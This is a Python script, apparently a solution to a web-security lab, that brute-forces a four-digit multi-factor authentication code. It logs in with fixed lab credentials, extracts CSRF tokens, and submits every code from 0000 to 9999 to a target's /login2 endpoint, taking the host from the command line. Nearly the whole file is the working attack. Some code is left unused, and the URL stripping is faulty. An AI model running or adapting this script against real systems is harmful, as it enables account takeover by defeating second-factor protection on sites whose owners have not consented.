import sys, requests, multiprocessing, time
from bs4 import BeautifulSoup

site = sys.argv[1]

if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

login_url = f'https://{site}/login'
login2_url = f'https://{site}/login2'


multiCPUProc = 5
countCPU = multiprocessing.cpu_count() - 1

#Taken from getUrls_multiprocessing.py and adapted for this functionality
def time_decorator(func):
  """
  Takes a function and returns a version of it that prints out the elapsed time for executing it
  :param func: Function to decorate
  :return: Function which outputs execution time
  :rtype: Function
  """
  def inner(*args, **kwargs):
      s = time.perf_counter()
      return_vals = func(*args, **kwargs)
      elapsed = time.perf_counter() - s
      print(f'Function returned: {return_vals}')
      return(elapsed)
  return(inner)
  

#Does the bascic login functionality that was given in Code labs
def login_user(s):
    resp = s.get(login_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')

    logindata = {
    'csrf' : csrf,
    'username' : 'carlos',
    'password' : 'montoya'
    }
    
    # print(f'Logging in as carlos:montoya')
    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf = soup.find('input', {'name':'csrf'}).get('value')
    # print(f'Login response: {resp.text}')

    return csrf

#Checks if the Auth Code given from get_multi is correct or not. If it is not correct than it tries the next code
def attack_auth():
    s = requests.Session()
    
    for i in range(0, 10000):
        csrf = login_user(s)

        login2data = {
            'csrf' : csrf,
            'mfa-code' : str(i).zfill(4)
        }

        resp = s.post(login2_url, data=login2data, allow_redirects=False)
        if resp.status_code == 200:
            print(f'{str(i).zfill(4) } || {resp.status_code}')
        if resp.status_code == 302:
            print(f'{str(i).zfill(4) } || {resp.status_code}')
            


if __name__ == '__main__':
    attack_auth()

    